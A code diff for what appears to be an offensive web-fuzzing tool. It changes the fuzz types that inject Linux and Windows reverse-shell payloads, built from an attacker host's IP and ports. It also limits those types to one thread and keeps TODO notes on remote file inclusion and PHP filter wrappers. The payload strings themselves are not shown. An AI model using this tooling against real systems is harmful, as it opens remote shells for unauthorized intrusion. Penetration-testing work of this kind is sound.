@@ -17,10 +17,8 @@ from .revshells import get_revshells
 from .sql import *
 from .wordlists import wordlist_strip_prefix
 
-# TODO: Revshell, download tools beforehand?
 # TODO: Remote file inclusion?
 #   - Test if we can establish a connection to a file hosted on a local webserver (configure http-server to serve basic shell.php).
-
 # TODO: PHP filters (php://filter/... and data://...)
 
 def relpath_linux(args):
@@ -86,15 +84,15 @@ FUZZ_TYPES = {
 
     "revshell-linux": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
-            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port, args.attackbox_web_port, os="linux")]
         ]),
-    ], encoders=[revshell_encoder_linux], required_args=["attackbox_ip", "attackbox_port"]),
+    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_port", "attackbox_web_port"]),
 
     "revshell-windows": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
-            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port, args.attackbox_web_port, os="windows")]
         ]),
-    ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
+    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_port", "attackbox_web_port"]),
 
     "sqli-execute-linux": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
@@ -302,6 +300,10 @@ def main():
             
     if args.known_part and (args.known_part[0] == "/" or args.known_part[-1] != "/"):
         print("--known-part should not start with a slash, and it should end with one")
+        return
+
+    if ("revshell-linux" in args.types or "revshell-windows" in args.types) and args.threads > 1:
+        print("revshell-linux and revshell-windows must be run with 1 thread only!")
         return
 
     response_search_targets = set()
